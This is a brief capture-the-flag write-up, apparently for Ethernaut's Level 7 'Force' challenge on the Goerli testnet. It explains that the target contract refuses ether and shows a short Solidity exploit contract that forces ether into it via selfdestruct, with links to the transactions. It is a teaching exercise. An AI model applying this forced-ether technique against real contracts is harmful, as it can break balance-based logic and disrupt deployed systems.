Level 7
==========================================================================================================================================

Deployment transaction: https://goerli.etherscan.io/tx/0x9ba2c6c789dfe5d478d32033d442dcedba6e9311319c225533c7008e332f97b9
Submission transaction: https://goerli.etherscan.io/tx/0xbe749442ba3ebe464bcc0f6a178a20890c4bda155d23ac26f52cfd743e115cf2

-------
This challenge's task is to send ether to the Force contract. 
It does not accept ethers via transfer/send/call functions.
Our options would be then to either mine blocks with this contract's address or to selfdestruct a contract passing Force's contract address
as argument. 

#### The exploit contract:

```
    address forceAddress;

    constructor(address _forceAddress) payable{
        forceAddress = _forceAddress;
    }

 function exploit() public {
        selfdestruct(forceAddress);
    }
```



[Selfdestruct tx](https://goerli.etherscan.io/tx/0x536cd16e5936c4519ac892197cfb0ce7fe82e5330578e8d0516d9aa69bb52283)








